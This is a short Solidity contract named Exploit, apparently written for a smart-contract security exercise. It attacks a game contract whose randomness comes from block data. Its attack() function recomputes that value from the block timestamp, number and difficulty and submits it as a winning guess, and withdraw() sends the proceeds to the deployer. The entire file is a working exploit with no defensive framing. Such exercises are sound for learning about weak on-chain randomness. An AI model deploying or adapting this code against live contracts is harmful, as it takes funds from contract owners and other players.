pragma solidity ^0.8.13;

interface IGame {
    function play(uint) external;
}

contract Exploit {
    address immutable game;
    address immutable owner;

    constructor(address gameAddr) {
        game = gameAddr;
        owner = msg.sender;
    }

    function attack() external {
        IGame gameContract = IGame(game);

        uint guess = uint(
            keccak256(
                abi.encodePacked(
                    block.timestamp,
                    block.number,
                    block.difficulty
                )
            )
        );
        gameContract.play(guess);
    }

    function withdraw() public OnlyOwner {
        uint256 amount = address(this).balance;
        require(amount > 0, "Nothing to withdraw; contract balance empty");

        (bool sent, ) = msg.sender.call{value: amount}("");
        require(sent, "Failed to send Ether");
    }

    receive() external payable {}

    fallback() external payable {}

    modifier OnlyOwner() {
        require(msg.sender == owner);
        _;
    }
}
